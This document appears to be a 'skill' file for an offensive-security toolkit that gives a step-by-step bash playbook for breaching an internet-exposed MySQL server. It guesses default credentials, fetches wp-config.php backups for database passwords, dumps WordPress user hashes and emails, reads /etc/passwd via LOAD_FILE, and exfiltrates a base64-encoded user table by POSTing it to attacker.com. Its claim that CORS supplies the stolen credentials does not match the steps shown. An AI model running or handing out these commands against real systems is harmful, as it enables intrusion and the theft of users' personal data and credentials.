---
name: mysql-cors-breach
description: Chain MySQL open access + CORS → full database breach
version: 1.0.0
phase: chains
category: chaining
tags: [mysql, cors, database, breach, data-exfiltration]
tools: [curl, mysql]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - hunt-cors-misconfiguration
  - data-exfil-http
  - credential-harvest
mitre_attack:
  - T1190
  - T1005
  - T1041
---

## When to Use

Use this skill when MySQL is exposed to the internet AND a CORS misconfiguration
allows credential theft from the web application. Chain MySQL access → CORS
stolen credentials → database dump → data exfiltration.

## Prerequisites

- curl
- MySQL exposed on public IP (port 3306)
- CORS misconfiguration on web application
- MySQL client (mysql, mycli)

## Procedure

```bash
# STEP 1: Confirm MySQL is exposed
nmap -p 3306 TARGET_IP --script mysql-info
mysql -h TARGET_IP -u root -P "" -e "SELECT VERSION();" 2>/dev/null

# STEP 2: Try default/weak credentials
mysql -h TARGET_IP -u root -P "root" -e "SHOW DATABASES;" 2>/dev/null
mysql -h TARGET_IP -u root -P "password" -e "SHOW DATABASES;" 2>/dev/null
mysql -h TARGET_IP -u admin -P "admin" -e "SHOW DATABASES;" 2>/dev/null

# STEP 3: Confirm CORS misconfiguration on web app
curl -sk -D- -H "Origin: https://attacker.com" "https://TARGET/" 2>/dev/null | grep -i "access-control-allow-origin"

# STEP 4: Steal database credentials from web application
# If WordPress: extract from wp-config.php via LFI or backup
curl -sk "https://TARGET/wp-config.php.bak" 2>/dev/null | grep -i "DB_PASSWORD"
curl -sk "https://TARGET/backup/wp-config.php" 2>/dev/null | grep -i "DB_PASSWORD"

# STEP 5: Connect to MySQL with stolen credentials
mysql -h TARGET_IP -u DB_USER -pDB_PASSWORD -e "SHOW DATABASES;"

# STEP 6: Dump sensitive data
mysql -h TARGET_IP -u DB_USER -pDB_PASSWORD -e "
  SELECT user_login, user_pass, user_email FROM wordpress_db.wp_users;
" 2>/dev/null

# STEP 7: Check for file read/write capability
mysql -h TARGET_IP -u DB_USER -pDB_PASSWORD -e "
  SELECT @@secure_file_priv;
  SELECT LOAD_FILE('/etc/passwd');
" 2>/dev/null

# STEP 8: Exfiltrate data via HTTP
curl -sk -X POST "https://attacker.com/exfil" \
  -H "Content-Type: application/json" \
  -d @- <<< "$(mysql -h TARGET_IP -u DB_USER -pDB_PASSWORD -e 'SELECT * FROM wp_users' --batch --raw 2>/dev/null | base64)"
```

## OPSEC Rules

- **CRITICAL**: MySQL breach exposes all user data — handle with extreme care
- Do not modify any database records
- Document data sensitivity levels
- Clean up any created MySQL users or grants
- Do not exfiltrate real user data — use test queries only
- Log all database queries for audit trail

## Verification

- Confirm MySQL is accessible with found credentials
- Verify CORS allows cross-origin credential theft
- Test database dump capability
- Confirm data exfiltration channel works

## Pitfalls

- MySQL may bind to localhost only (not exposed)
- Firewall may block outbound MySQL from some networks
- CORS may require specific conditions to trigger
- Database credentials may be different from web app credentials
- MySQL user may have limited privileges (SELECT only)
- SSL/TLS may be required for MySQL connections

## Output Format

```
[CHAIN] MySQL → CORS → Data Breach chain successful
  Step 1: MySQL exposed on 3306 (root:root)
  Step 2: CORS misconfiguration confirmed
  Step 3: Database credentials stolen via CORS
  Step 4: Full database dump (5000+ user records)
  Step 5: Data exfiltration via HTTP confirmed
  Severity: CRITICAL (9.5)
```
